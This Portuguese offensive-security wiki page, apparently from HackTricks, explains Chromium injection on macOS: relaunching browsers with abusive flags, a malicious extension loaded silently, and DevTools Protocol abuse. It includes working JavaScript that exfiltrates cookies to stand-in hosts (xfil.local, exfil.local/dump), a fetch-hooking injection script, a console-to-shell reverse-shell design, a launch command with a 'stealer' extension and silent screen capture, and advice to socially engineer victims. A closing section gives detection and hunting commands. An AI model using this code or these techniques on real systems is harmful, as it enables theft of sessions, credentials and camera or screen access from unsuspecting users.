# Injeção de Chromium

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Browsers baseados em Chromium, como Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, consomem os mesmos switches de linha de comando, arquivos de preferências e interfaces de automação do DevTools. No macOS, qualquer usuário com acesso à GUI pode encerrar uma sessão existente do browser e reabri-la com flags arbitrárias, extensões ou endpoints do DevTools que são executados com os entitlements do alvo.

#### Iniciando o Chromium com flags personalizadas no macOS

O macOS mantém uma única instância de UI por perfil do Chromium, portanto a instrumentação normalmente exige o fechamento forçado do browser (por exemplo, com `osascript -e 'tell application "Google Chrome" to quit'`). Attackers normalmente reiniciam usando `open -na "Google Chrome" --args <flags>` para injetar argumentos sem modificar o app bundle. Envolver esse comando em um LaunchAgent do usuário (`~/Library/LaunchAgents/*.plist`) ou em um login hook garante que o browser adulterado seja reiniciado após o reboot/logoff.

#### Flag `--load-extension`

A flag `--load-extension` carrega automaticamente extensões não empacotadas (caminhos separados por vírgulas). Combine-a com `--disable-extensions-except` para bloquear extensões legítimas enquanto força a execução apenas do seu payload. Extensões maliciosas podem solicitar permissões de alto impacto, como `debugger`, `webRequest` e `cookies`, para pivotar para protocolos do DevTools, modificar headers CSP, fazer downgrade de HTTPS ou exfiltrar material de sessão assim que o browser iniciar.<sup>[[4]](#references)</sup>

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Esses switches expõem o Chrome DevTools Protocol (CDP) via TCP ou pipe, permitindo que ferramentas externas controlem o browser. O Google observou abuso generalizado dessa interface por infostealers e, a partir do Chrome 136 (março de 2025), os switches são ignorados para o perfil padrão, a menos que o browser seja iniciado com um `--user-data-dir` não padrão. Isso impõe o App-Bound Encryption em perfis reais, mas attackers ainda podem criar um perfil novo, induzir a vítima a autenticar-se dentro dele (com phishing/triage assistance) e coletar cookies, tokens, estados de confiança do dispositivo ou registros WebAuthn via CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Essa flag redireciona todo o perfil do browser (History, Cookies, Login Data, arquivos de Preferences etc.) para um caminho controlado pelo attacker. Ela é obrigatória ao combinar builds modernos do Chrome com `--remote-debugging-port` e também mantém o perfil adulterado isolado, permitindo inserir arquivos `Preferences` ou `Secure Preferences` pré-preenchidos que desativam prompts de segurança, instalam extensões automaticamente e alteram os schemes padrão.

#### Flag `--use-fake-ui-for-media-stream`

Esse switch ignora o prompt de permissão da câmera/microfone, fazendo com que qualquer página que chame `getUserMedia` receba acesso imediatamente. Combine-o com flags como `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ou comandos CDP `Browser.grantPermissions` para capturar áudio/vídeo silenciosamente, compartilhar a tela ou satisfazer verificações de permissão do WebRTC sem interação do usuário.<sup>[[4]](#references)</sup>

## Padrões de Delivery e Relaunch observados na prática

O abuso de CDP é normalmente uma etapa de **post-exploitation**, e não o payload inicial. Uma campanha recente do macOS direcionada a developers usou uma fase de build **`Run Script`** envenenada (`PBXShellScriptBuildPhase`) para que o código fosse executado somente quando a vítima **fizesse o build** do projeto, e não quando apenas o clonasse ou abrisse. Após essa primeira execução, o malware também infectava outras árvores `.xcodeproj`, adicionava hooks maliciosos do Git `pre-commit` e procurava mais projetos Xcode em arquivos ZIP.<sup>[[3]](#references)</sup>

Para o abuso de Chromium, isso é importante porque o attacker não precisa modificar o binário do browser. Um stager de curta duração de build-phase / `osascript` pode, em vez disso, instalar um **browser wrapper** (LaunchAgent, login item, entrada no Dock, app launcher trojanizado etc.) que reabre o browser legítimo com flags controladas pelo attacker sempre que o usuário o inicia.<sup>[[3]](#references)</sup>

> [!TIP]
> Em endpoints de developers, inspecione arquivos `.pbxproj`, `.git/hooks/pre-commit` e ZIPs contendo `.xcodeproj` em busca de `curl`, `osascript`, `xxd`, `base64` aninhado ou lógica inesperada de relaunch do Chrome.

## Remote Debugging e abuso do DevTools Protocol

Depois que o Chrome for reiniciado com um `--user-data-dir` dedicado e `--remote-debugging-port`, você poderá conectar-se via CDP (por exemplo, usando `chrome-remote-interface`, `puppeteer` ou `playwright`) e automatizar workflows de alto privilégio:

- **Roubo de cookies/sessão:** `Network.getAllCookies` e `Storage.getCookies` retornam valores HttpOnly mesmo quando o App-Bound encryption normalmente bloquearia o acesso ao filesystem, porque o CDP solicita que o browser em execução os descriptografe.
- **Adulteração de permissões:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` permitem ignorar prompts de câmera/microfone (especialmente quando combinados com `--use-fake-ui-for-media-stream`) ou falsificar verificações de segurança baseadas em localização.
- **Injeção de keystrokes/scripts:** `Runtime.evaluate` executa JavaScript arbitrário dentro da aba ativa, permitindo coletar credenciais, modificar o DOM ou injetar beacons de persistência que sobrevivem à navegação.<sup>[[1]](#references)</sup>
- **Exfiltração em tempo real:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` interceptam requests/responses autenticados em tempo real sem tocar nos artefatos do disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Como o Chrome 136 bloqueia o CDP no perfil padrão, copiar e colar o diretório existente `~/Library/Application Support/Google/Chrome` da vítima para um caminho de staging não resulta mais em cookies descriptografados. Em vez disso, faça engenharia social com o usuário para que ele se autentique dentro do perfil instrumentado (por exemplo, em uma sessão de suporte "útil") ou capture tokens MFA em trânsito por meio de hooks de rede controlados pelo CDP.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Um padrão prático de malware é:

1. Reiniciar o implant ou wrapper em userland sempre que o Chrome for iniciado.
2. Iniciar o navegador legítimo com `--remote-debugging-port=<port>` e, no Chrome 136+, geralmente com um `--user-data-dir=<dir>` não padrão emparelhado.
3. Iniciar um helper que se conecte ao WebSocket CDP local e registre um hook pré-documento com `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Esse helper pode injetar JavaScript **antes** da execução do código do site, o que é ideal para aplicar hooks em `window.fetch`, `XMLHttpRequest`, provedores de wallets ou fluxos de autofill sem modificar arquivos no disco.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Uma variante mais poderosa transforma o navegador em uma **ponte de comandos do host**: o JavaScript injetado emite um `console.log` marcado com um delimitador, o helper local monitora `Runtime.consoleAPICalled`, remove o marcador, executa o restante através do shell do host (por exemplo, `exec.Command` do Go) e retorna stdout/stderr pelo WebSocket do atacante. Isso eleva a execução de scripts no nível da aba a um reverse shell quase totalmente fileless.<sup>[[3]](#references)</sup>

## Injeção baseada em extensão via API do debugger

A pesquisa de 2023, "Chrowned by an Extension", demonstrou que uma extensão maliciosa usando a API `chrome.debugger` pode se conectar a qualquer aba e obter os mesmos poderes do DevTools que `--remote-debugging-port`.<sup>[[6]](#references)</sup> Isso rompe as premissas originais de isolamento (as extensões permanecem em seu próprio contexto) e permite:

- Roubo silencioso de cookies e credenciais com `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modificação das permissões de sites (câmera, microfone, geolocalização) e bypass de intersticiais de segurança, permitindo que páginas de phishing se passem por diálogos do Chrome.
- Adulteração on-path de avisos TLS, downloads ou prompts do WebAuthn ao acionar programaticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ou `Security.handleCertificateError`.

Carregue a extensão com `--load-extension`/`--disable-extensions-except` para que nenhuma interação do usuário seja necessária. Um script de background mínimo que weaponiza a API tem esta aparência:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
A extensão também pode se inscrever em eventos `Debugger.paused` para ler variáveis JavaScript, modificar scripts inline ou adicionar breakpoints personalizados que persistem após a navegação. Como tudo é executado dentro da sessão GUI do usuário, Gatekeeper e TCC não são acionados, tornando essa técnica ideal para malware que já obteve execução no contexto do usuário.<sup>[[6]](#references)</sup>

## Detecção e Hunting

- Gere alertas para navegadores Chromium iniciados com `--remote-debugging-port`, `--remote-debugging-pipe` ou um `--user-data-dir` suspeito, especialmente quando o processo pai for `bash`, `sh`, `osascript`, `xcodebuild` ou um helper de LaunchAgent.
- Procure cadeias curtas nas quais um helper abre um WebSocket CDP local, registra `Page.addScriptToEvaluateOnNewDocument` e, em seguida, estabelece uma conexão WebSocket/HTTPS de longa duração para fora.
- Procure bridges de console para shell correlacionando a atividade de `Runtime.consoleAPICalled` do navegador com shells filhos ou processos helper que executam comandos fornecidos pelo atacante.
- Em Macs de desenvolvedores, revise as entradas `PBXShellScriptBuildPhase` de `.pbxproj`, hooks `pre-commit` do Git, relançadores de itens do Dock/login e projetos Xcode contidos em ZIP em busca da instalação de wrappers do navegador.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Ferramentas

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza inicializações do Chromium com extensões de payload e expõe hooks interativos do CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ferramenta semelhante focada na interceptação de tráfego e instrumentação do navegador para operadores de macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteca Node.js para criar scripts que extraem dados do Chrome DevTools Protocol (cookies, DOM, permissões) assim que uma instância com `--remote-debugging-port` estiver ativa.

### Exemplo
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Encontre mais exemplos nos links das tools.

## Referências

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
